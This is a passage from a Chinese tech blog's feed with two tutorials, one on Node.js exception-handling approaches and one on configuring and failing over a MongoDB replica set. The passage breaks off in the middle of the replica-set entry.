    <id>https://www.scery.com/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F.htm</id>
    <published>2020-08-23T07:36:59.000Z</published>
    <updated>2024-09-16T08:46:47.759Z</updated>
    
    <content type="html"><![CDATA[<h1 id="在Node-js中常用的异常处理方式有哪些？"><a href="#在Node-js中常用的异常处理方式有哪些？" class="headerlink" title="在Node.js中常用的异常处理方式有哪些？"></a><strong>在Node.js中常用的异常处理方式有哪些？</strong></h1><h2 id="1-使用try-catch方式来处理异常"><a href="#1-使用try-catch方式来处理异常" class="headerlink" title="1.使用try catch方式来处理异常"></a>1.使用try catch方式来处理异常</h2><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  throw <span class="keyword">new</span> Error(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;异常被捕获了，我现在还可以继续执行了&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后执行命令行时候，可以看到如下，也会打印后面的 console.log的信息了；如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231525919-500969949.png" alt="561794-20190325231525919-500969949"></p><p>但是使用 try catch 无法处理异步代码块内出现的异常，比如如下代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    throw <span class="keyword">new</span> Error(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;异常被捕获了，我现在还可以继续执行了&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在命令行中打印信息如下：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231600301-1445960885.png" alt="561794-20190325231600301-1445960885"></p><p>可以看到，catch里面的console.log(‘’); 代码并没有被执行。说明catch里面的代码异常并没有被捕获到。</p><h2 id="2-使用event方式来处理异常"><a href="#2-使用event方式来处理异常" class="headerlink" title="2.使用event方式来处理异常"></a>2.使用event方式来处理异常</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> events = <span class="built_in">require</span>(<span class="string">&#x27;events&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个事件监听对象</span></span><br><span class="line"><span class="keyword">const</span> emitter = <span class="keyword">new</span> events.<span class="title class_">EventEmitter</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听error事件</span></span><br><span class="line">emitter.<span class="title function_">addListener</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 处理异常信息</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">11122222</span>); <span class="comment">// 能打印 1112222 说明异常捕获到了</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发 error事件</span></span><br><span class="line">emitter.<span class="title function_">emit</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;你代码出错了&#x27;</span>));</span><br></pre></td></tr></table></figure><p>执行效果如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231650303-1807839302.png" alt="561794-20190325231650303-1807839302"></p><p><strong>2.3 callback的方式</strong></p><p>比如读取一个文件，或者创建一个目录，测试代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">mkdir</span>(<span class="string">&#x27;/dir&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;异常信息处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;创建目录成功&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后执行结果如下图所示：</p><p><img src="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/561794-20190325231727972-2095299768.png" alt="561794-20190325231727972-2095299768"></p><h2 id="3-Promise方式"><a href="#3-Promise方式" class="headerlink" title="3.Promise方式"></a><strong>3.Promise方式</strong></h2><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;).<span class="keyword">then</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="regexp">//</span> 。。。。</span><br><span class="line">&#125;).<span class="keyword">catch</span>(<span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;能进来说明可以处理异常信息了&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行结果如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231800997-1387265798.png" alt="561794-20190325231800997-1387265798"></p><p>如上是处理同步代码，但是如果是异步代码呢？继续如下代码测试：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">(resolve, reject)</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;).<span class="keyword">then</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="regexp">//</span> 。。。。</span><br><span class="line">&#125;).<span class="keyword">catch</span>(<span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;能进来说明可以处理异常信息了&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后执行结果如下所示：</p><p><img src="/Nodejs%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F/561794-20190325231831471-2125390414.png" alt="561794-20190325231831471-2125390414"></p><p>可以看到，Promise也是一样无法捕获异步代码中的异常信息了。</p><h2 id="4-Async-Await-方式"><a href="#4-Async-Await-方式" class="headerlink" title="4.Async/Await 方式"></a><strong>4.Async/Await 方式</strong></h2><p>Async/Await 也是基于Promise的，Promise是无法捕获异步异常，因此Async/Await 也是没有办法捕获的。如下测试代码：</p><p>先看同步代码可以捕获到的，代码如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testFunc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testAsync</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">testFunc</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;能进来，说明异常能处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testAsync</span>();</span><br></pre></td></tr></table></figure><p>执行结果如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231912878-714948440.png" alt="561794-20190325231912878-714948440"></p><p>我们再看异步代码，如下所示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testFunc = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">1111</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testAsync</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">testFunc</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;能进来，说明异常能处理&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testAsync</span>();</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325231942744-382555430.png" alt="561794-20190325231942744-382555430"></p><h2 id="5-process方式-该方式既可以处理同步代码的异常，也可以处理异步代码的异常-。"><a href="#5-process方式-该方式既可以处理同步代码的异常，也可以处理异步代码的异常-。" class="headerlink" title="5.process方式(该方式既可以处理同步代码的异常，也可以处理异步代码的异常)。"></a><strong>5.process方式(该方式既可以处理同步代码的异常，也可以处理异步代码的异常)。</strong></h2><p>如下同步代码异常：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我能进来，说明可以处理异常&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">testFunc</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">testFunc</span>();</span><br></pre></td></tr></table></figure><p>执行结果如下所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232019749-1652359803.png" alt="561794-20190325232019749-1652359803"></p><p>异步代码如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">process.<span class="literal">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明可以处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function testFunc() &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">testFunc();</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232050213-1983149986.png" alt="561794-20190325232050213-1983149986"></p><h2 id="6-domain方式"><a href="#6-domain方式" class="headerlink" title="6.domain方式"></a><strong>6.domain方式</strong></h2><p><strong>domain也可以处理任何类型异常的信息，包含同步和异步。</strong></p><p>如下同步代码所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line">const d = domain.create();</span><br><span class="line"></span><br><span class="line">d.<span class="literal">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明能处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.run(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;同步代码处理&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232130654-246536331.png" alt="561794-20190325232130654-246536331"></p><p>异步代码如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line">const domain = <span class="built_in">require</span>(<span class="string">&#x27;domain&#x27;</span>);</span><br><span class="line">const d = domain.create();</span><br><span class="line"></span><br><span class="line">d.<span class="literal">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="params">(e)</span> =&gt;</span> &#123;</span><br><span class="line">  console.log(<span class="string">&#x27;我能进来，说明能处理异常&#x27;</span>);</span><br><span class="line">  console.log(e);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">d.run(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;异步代码处理&#x27;</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/561794-20190325232200670-1523570411.png" alt="561794-20190325232200670-1523570411"></p>]]></content>
    
    
    <summary type="html">介绍Node.js中常用的异常处理方式</summary>
    
    
    
    <category term="Linux" scheme="https://www.scery.com/categories/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/categories/Linux/Nodejs/"/>
    
    <category term="异常处理" scheme="https://www.scery.com/categories/Linux/Nodejs/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    
    
    <category term="Linux" scheme="https://www.scery.com/tags/Linux/"/>
    
    <category term="Nodejs" scheme="https://www.scery.com/tags/Nodejs/"/>
    
    <category term="异常处理" scheme="https://www.scery.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB集群-副本集</title>
    <link href="https://www.scery.com/MongoDB%E9%9B%86%E7%BE%A4-%E5%89%AF%E6%9C%AC%E9%9B%86.htm"/>
    <id>https://www.scery.com/MongoDB%E9%9B%86%E7%BE%A4-%E5%89%AF%E6%9C%AC%E9%9B%86.htm</id>
    <published>2020-07-30T13:43:04.000Z</published>
    <updated>2024-03-18T02:51:00.712Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB副本集"><a href="#MongoDB副本集" class="headerlink" title="MongoDB副本集"></a>MongoDB副本集</h1><h3 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h3><p>MongoDB 副本集（Replica Set）是有自动故障恢复功能的主从集群，有一个Primary节点和一个或多个Secondary节点组成。类似于MySQL的MMM架构。更多关于副本集的介绍请见<a href="https://docs.mongodb.com/manual/replication/">官网</a>。</p><h3 id="2-原理"><a href="#2-原理" class="headerlink" title="2.原理"></a>2.原理</h3><p>副本集中数据同步过程：Primary节点写入数据，Secondary通过读取Primary的oplog得到复制信息，开始复制数据并且将复制信息写入到自己的oplog。如果某个操作失败，则备份节点停止从当前数据源复制数据。如果某个备份节点由于某些原因挂掉了，当重新启动后，就会自动从oplog的最后一个操作开始同步，同步完成后，将信息写入自己的oplog，由于复制操作是先复制数据，复制完成后再写入oplog，有可能相同的操作会同步两份，不过MongoDB在设计之初就考虑到这个问题，将oplog的同一个操作执行多次，与执行一次的效果是一样的。简单的说就是：</p><p>当Primary节点完成数据操作后，Secondary会做出一系列的动作保证数据的同步</p><ul><li>检查自己local库的oplog.rs集合找出最近的时间戳。</li><li>检查Primary节点local库oplog.rs集合，找出大于此时间戳的记录。</li><li>将找到的记录插入到自己的oplog.rs集合中，并执行这些操作。</li></ul><p>副本集的同步和主从同步一样，都是异步同步的过程，不同的是副本集有个自动故障转移的功能。其原理是：slave端从primary端获取日志，然后在自己身上完全顺序的执行日志所记录的各种操作（该日志是不记录查询操作的），这个日志就是local数据 库中的oplog.rs表，默认在64位机器上这个表是比较大的，占磁盘大小的5%，oplog.rs的大小可以在启动参数中设 定：–oplogSize 1000,单位是M。</p><blockquote><p>注意：在副本集的环境中，要是所有的Secondary都宕机了，只剩下Primary。最后Primary会变成Secondary，不能提供服务。</p></blockquote><h4 id="2-1自动切换"><a href="#2-1自动切换" class="headerlink" title="2.1自动切换"></a>2.1自动切换</h4><h5 id="集群开始如下："><a href="#集群开始如下：" class="headerlink" title="集群开始如下："></a>集群开始如下：</h5><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200730214916761.png" alt="image-20200730214916761"></p><h5 id="primary挂了以后"><a href="#primary挂了以后" class="headerlink" title="primary挂了以后:"></a>primary挂了以后:</h5><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20200730215028695.png" alt="image-20200730215028695"></p><h3 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h3><h4 id="3-1环境准备"><a href="#3-1环境准备" class="headerlink" title="3.1环境准备"></a>3.1环境准备</h4><table><thead><tr><th>IP</th><th>主机名</th><th>系统</th><th>安装软件</th></tr></thead><tbody><tr><td>10.0.0.100</td><td>Server1</td><td>centos7</td><td>mongodb</td></tr><tr><td>10.0.0.101</td><td>Server2</td><td>centos7</td><td>mongodb</td></tr><tr><td>10.0.0.102</td><td>Server3</td><td>centos7</td><td>mongodb</td></tr></tbody></table><p>安装过程就忽略了。。。。</p><p>在每个服务器的mongodb配置文件加上：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//y</span>aml格式</span><br><span class="line">replication:</span><br><span class="line">  replSetName: repset</span><br><span class="line"><span class="regexp">//</span>如果是普通格式化</span><br><span class="line">replSet=anthony</span><br></pre></td></tr></table></figure><blockquote><p>mongod的配置文件，有yaml格式也有普通的=格式。</p><p>yaml格式的参考 <a href="https://docs.mongodb.com/manual/reference/configuration-options/#replication.replSetNam">https://docs.mongodb.com/manual/reference/configuration-options/#replication.replSetNam</a></p></blockquote><h3 id="4-初始化配置复制集"><a href="#4-初始化配置复制集" class="headerlink" title="4.初始化配置复制集"></a>4.初始化配置复制集</h3><h4 id="4-1-在主服务器创建复制集"><a href="#4-1-在主服务器创建复制集" class="headerlink" title="4.1 在主服务器创建复制集"></a>4.1 在主服务器创建复制集</h4><p>我们先配置包含两个节点的复制集，多出来的一个节点，会在接下来再做一个节点添加的操作</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mongo</span></span><br><span class="line"><span class="attribute">server</span>=&#123;<span class="string">&quot;_id&quot;</span>:<span class="string">&quot;anthony&quot;</span>,<span class="string">&quot;members&quot;</span>:[&#123;<span class="string">&quot;_id&quot;</span>:<span class="number">0</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.0.0.101:27017&quot;</span>&#125;,&#123;<span class="string">&quot;_id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;host&quot;</span>:<span class="string">&quot;10.0.0.102:27017&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure><h4 id="4-2-初始化复制集"><a href="#4-2-初始化复制集" class="headerlink" title="4.2 初始化复制集"></a>4.2 初始化复制集</h4><p>在初始化复制集时，要确保从节点没有数据，不然在初始化以后会造成从节点服务器的数据丢失。</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">rs.initiate(<span class="keyword">server</span>)</span><br></pre></td></tr></table></figure><h4 id="4-3-查看复制集中各节点状态"><a href="#4-3-查看复制集中各节点状态" class="headerlink" title="4.3 查看复制集中各节点状态"></a>4.3 查看复制集中各节点状态</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">anthony:SECONDARY&gt; rs.status()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;set&quot;</span> : <span class="string">&quot;anthony&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span> : ISODate(<span class="string">&quot;2020-07-14T14:40:20.756Z&quot;</span>),</span><br><span class="line">         ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">    <span class="string">&quot;members&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.100:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,             <span class="regexp">//</span>健康值为<span class="number">1</span>，代表该节点处于运行良好状态</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">1</span>,               <span class="regexp">//</span><span class="number">1</span>代表主</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;PRIMARY&quot;</span>,   <span class="regexp">//</span>处于peimary状态</span><br><span class="line">         ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.101:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,              <span class="regexp">//</span><span class="number">2</span>代表从</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>, <span class="regexp">//</span>处于secondary状态</span><br><span class="line">        ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>,</span><br><span class="line">        ···     <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">anthony:PRIMARY&gt;            <span class="regexp">//</span>此时节点状态已经发生转变</span><br></pre></td></tr></table></figure><h3 id="5-节点管理-在primary上做"><a href="#5-节点管理-在primary上做" class="headerlink" title="5.节点管理(在primary上做)"></a>5.节点管理(在primary上做)</h3><h4 id="1-添加节点"><a href="#1-添加节点" class="headerlink" title="1. 添加节点"></a>1. 添加节点</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">rs.<span class="built_in">add</span>(<span class="string">&quot;10.0.0.103:27017&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-删除节点"><a href="#2-删除节点" class="headerlink" title="2. 删除节点"></a>2. 删除节点</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">rs.<span class="built_in">remove</span>(<span class="string">&quot;10.0.0.103:27017&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="6-故障转移切换"><a href="#6-故障转移切换" class="headerlink" title="6.故障转移切换"></a>6.故障转移切换</h3><h4 id="1-模拟主节点损坏"><a href="#1-模拟主节点损坏" class="headerlink" title="1. 模拟主节点损坏"></a>1. 模拟主节点损坏</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">ps aux | grep  mongod     <span class="regexp">//</span>查询本地的节点的进程号</span><br><span class="line">kill -<span class="number">9</span> <span class="number">40882</span>             <span class="regexp">//</span>杀死主节点进程</span><br></pre></td></tr></table></figure><h4 id="2-查看节点状态"><a href="#2-查看节点状态" class="headerlink" title="2. 查看节点状态"></a>2. 查看节点状态</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">anthony:SECONDARY&gt; rs.status()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;set&quot;</span> : <span class="string">&quot;anthony&quot;</span>,</span><br><span class="line">    <span class="string">&quot;date&quot;</span> : ISODate(<span class="string">&quot;2020-07-14T15:21:21.426Z&quot;</span>),</span><br><span class="line">    <span class="string">&quot;myState&quot;</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="string">&quot;term&quot;</span> : NumberLong(<span class="number">2</span>),</span><br><span class="line">    <span class="string">&quot;syncingTo&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syncSourceHost&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">    <span class="string">&quot;syncSourceId&quot;</span> : <span class="number">2</span>,</span><br><span class="line">           ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">    <span class="string">&quot;members&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">0</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.100:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">0</span>,             <span class="regexp">//</span>健康值为<span class="number">0</span>，处于停机状态</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">8</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;(not reachable/healthy)&quot;</span>,</span><br><span class="line">           ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.101:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;SECONDARY&quot;</span>,</span><br><span class="line">            ···   <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;_id&quot;</span> : <span class="number">2</span>,</span><br><span class="line">            <span class="string">&quot;name&quot;</span> : <span class="string">&quot;10.0.0.102:27017&quot;</span>,</span><br><span class="line">            <span class="string">&quot;health&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;state&quot;</span> : <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;stateStr&quot;</span> : <span class="string">&quot;PRIMARY&quot;</span>,</span><br><span class="line">            ···    <span class="regexp">//</span>省略部分内容</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-主动切换主从状态-在primary上做"><a href="#7-主动切换主从状态-在primary上做" class="headerlink" title="7.主动切换主从状态(在primary上做)"></a>7.主动切换主从状态(在primary上做)</h3><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">rs.<span class="keyword">freeze</span>(<span 